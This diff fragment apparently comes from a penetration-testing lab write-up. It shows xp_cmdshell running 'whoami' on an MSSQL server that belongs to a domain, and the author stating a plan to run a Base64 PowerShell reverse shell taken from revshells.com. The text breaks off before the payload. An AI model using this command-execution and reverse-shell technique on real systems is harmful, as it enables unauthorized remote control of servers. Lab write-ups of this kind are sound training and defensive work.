@@ -1,0 +1,1 @@
+zero.ext] (dc01_sql_svc dbo@master)> xp_cmdshell whoami output -------------------- darkzero-ext\svc_sql NULL Shell I’ll grab a PowerShell #3 (Base64) reverse shell from revshells.com and run it on the MSSQL server: SQL >[DC02.darkzero.ext] (dc01_sql_svc dbo@master)> xp_cmdshell powershell -e
